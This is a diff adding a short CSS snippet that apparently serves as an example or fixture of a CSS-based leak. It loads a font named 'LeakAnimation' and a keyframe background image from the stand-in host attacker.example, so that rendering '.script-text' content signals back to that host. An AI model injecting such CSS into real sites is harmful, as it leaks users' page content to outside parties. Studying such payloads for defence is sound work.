@@ -1,0 +1,13 @@
+@font-face {
+  font-family: "LeakAnimation";
+  src: url("https://attacker.example/leakanimation.woff2") format("woff2");
+}
+.script-text {
+  font-family: "LeakAnimation";
+  animation: leak-step 1s linear;
+}
+@keyframes leak-step {
+  50% {
+    background-image: url("https://attacker.example/keyframe-hit.png");
+  }
+}
